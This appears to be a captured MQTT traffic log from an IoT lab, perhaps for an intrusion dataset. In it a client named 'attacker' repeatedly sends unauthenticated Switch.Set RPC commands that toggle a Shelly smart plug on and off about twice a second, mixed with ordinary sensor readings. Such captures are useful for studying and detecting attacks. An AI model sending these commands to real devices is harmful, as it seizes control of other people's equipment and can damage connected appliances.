2026-04-22T16:18:37,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:37,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33250.42,""swi"
2026-04-22T16:18:37,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3754 33250.446 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:38,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:38,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3755 33250.927 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:38,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:38,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33250.92,""swi"
2026-04-22T16:18:38,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3756 33250.944 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:38,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:38,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:38,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3757 33251.428 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:38,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:38,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33251.42,""swi"
2026-04-22T16:18:38,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3758 33251.446 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:39,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:39,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3759 33251.930 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:39,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:39,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33251.93,""swi"
2026-04-22T16:18:39,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3760 33251.946 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:39,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:39,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:39,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:39,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:39,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3761 33252.429 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:39,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:39,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33252.43,""swi"
2026-04-22T16:18:39,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3762 33252.447 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:40,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:40,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3763 33252.963 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:40,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:40,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33252.96,""swi"
2026-04-22T16:18:40,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3764 33252.979 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:40,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:40,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:40,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3765 33253.437 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:40,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:40,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33253.43,""swi"
2026-04-22T16:18:40,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3766 33253.455 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:41,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:41,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3767 33253.930 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:41,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:41,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33253.93,""swi"
2026-04-22T16:18:41,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3768 33253.947 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:41,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:41,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:41,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3769 33254.431 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:41,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:41,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33254.43,""swi"
2026-04-22T16:18:41,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3770 33254.451 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:42,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:42,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3771 33254.932 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:42,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:42,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33254.93,""swi"
2026-04-22T16:18:42,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3772 33254.948 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:42,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:42,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3773 33255.434 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:42,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:42,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33255.43,""swi"
2026-04-22T16:18:42,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3774 33255.453 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:43,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:43,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3775 33255.934 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:43,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:43,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33255.93,""swi"
2026-04-22T16:18:43,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3776 33255.950 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:43,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:43,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3777 33256.435 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:43,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:43,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33256.43,""swi"
2026-04-22T16:18:43,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3778 33256.454 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:44,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:44,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3779 33256.934 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:44,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:44,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33256.93,""swi"
2026-04-22T16:18:44,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3780 33256.951 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:44,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:44,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:44,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:44,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3781 33257.434 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:44,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:44,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33257.43,""swi"
2026-04-22T16:18:44,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3782 33257.453 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:45,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:45,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3783 33257.935 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:45,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:45,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33257.93,""swi"
2026-04-22T16:18:45,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3784 33257.952 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:45,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:45,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3785 33258.435 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:45,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:45,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33258.43,""swi"
2026-04-22T16:18:45,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3786 33258.454 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:46,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:46,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3787 33258.936 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:46,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:46,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33258.93,""swi"
2026-04-22T16:18:46,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3788 33258.953 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:18:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:18:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:18:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:18:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:18:46,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:46,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3789 33259.437 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:46,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:46,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33259.43,""swi"
2026-04-22T16:18:46,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3790 33259.456 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:47,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:47,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3791 33259.938 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:47,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:47,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33259.93,""swi"
2026-04-22T16:18:47,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3792 33259.954 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:47,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:47,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3793 33260.438 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:47,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:47,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33260.44,""swi"
2026-04-22T16:18:47,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3794 33260.457 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:48,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:48,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3795 33260.939 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:48,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:48,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33260.94,""swi"
2026-04-22T16:18:48,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3796 33260.955 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:48,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:48,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3797 33261.443 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:48,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:48,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33261.44,""swi"
2026-04-22T16:18:48,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3798 33261.462 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:49,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:49,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3799 33261.947 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:49,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:49,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33261.94,""swi"
2026-04-22T16:18:49,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3800 33261.963 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:49,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:49,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3801 33262.451 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:49,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:49,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33262.45,""swi"
2026-04-22T16:18:49,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3802 33262.469 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:50,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:50,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3803 33262.949 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:50,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:50,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33262.95,""swi"
2026-04-22T16:18:50,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3804 33262.966 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:50,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:50,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3805 33263.457 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
